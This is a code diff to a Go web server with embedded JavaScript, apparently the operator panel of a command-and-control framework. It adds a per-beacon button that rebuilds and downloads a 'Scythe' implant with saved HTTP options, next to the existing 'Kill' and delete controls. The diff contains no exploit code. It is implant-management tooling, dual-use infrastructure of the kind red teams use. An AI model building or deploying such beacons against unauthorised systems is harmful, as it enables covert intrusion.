@@ -123,7 +123,9 @@ func (s *Server) handleBeaconsPage(w http.ResponseWriter, r *http.Request) {
 		rows.WriteString(`</pre><button type="button" class="btn-tiny" onclick="copyBeaconField('`)
 		rows.WriteString(idScythe)
 		rows.WriteString(`')">Copy</button></div>`)
-		rows.WriteString(`</div></details><button type="button" class="btn btn-kill" data-kill="`)
+		rows.WriteString(`</div></details><button type="button" class="btn btn-secondary" data-embed="`)
+		rows.WriteString(template.HTMLEscapeString(p.ClientID))
+		rows.WriteString(`" title="Rebuild and download Scythe with this profile's saved Http options">Scythe.embedded</button><button type="button" class="btn btn-kill" data-kill="`)
 		rows.WriteString(template.HTMLEscapeString(p.ClientID))
 		rows.WriteString(`">Kill</button><button type="button" class="btn btn-secondary" data-del="`)
 		rows.WriteString(pid)
@@ -207,9 +209,10 @@ document.getElementById('gen').onclick = async function() {
   out.textContent = r.ok ? JSON.stringify(j, null, 2) : (j.error || r.statusText);
   if (r.ok && j.client_id) { lastClientId = j.client_id; dl.style.display = 'inline-block'; }
 };
-document.getElementById('dlembed').onclick = async function() {
-  if (!lastClientId) { alert('Generate a beacon first.'); return; }
-  var r = await fetch('/api/beacons/scythe-embedded', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ client_id: lastClientId, scythe_http: scytheHttpPayload() }) });
+async function downloadScytheEmbedded(clientId, scytheHttp) {
+  var payload = { client_id: clientId };
+  if (scytheHttp) { payload.scythe_http = scytheHttp; }
+  var r = await fetch('/api/beacons/scythe-embedded', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
   if (!r.ok) {
     var errText = await r.text();
     try { var ej = JSON.parse(errText); if (ej.error) errText = ej.error; } catch (e) {}
@@ -228,7 +231,23 @@ document.getElementById('dlembed').onclick = async function() {
   a.click();
   URL.revokeObjectURL(a.href);
   document.body.removeChild(a);
+}
+document.getElementById('dlembed').onclick = async function() {
+  if (!lastClientId) { alert('Generate a beacon first.'); return; }
+  await downloadScytheEmbedded(lastClientId, scytheHttpPayload());
 };
+document.querySelectorAll('[data-embed]').forEach(function(btn) {
+  btn.onclick = async function() {
+    var cid = btn.getAttribute('data-embed');
+    if (!cid) return;
+    btn.disabled = true;
+    try {
+      await downloadScytheEmbedded(cid, null);
+    } finally {
+      btn.disabled = false;
+    }
+  };
+});
 document.getElementById('reflist').onclick = function() { location.reload(); };
 function copyBeaconField(elId) {
   var el = document.getElementById(elId);
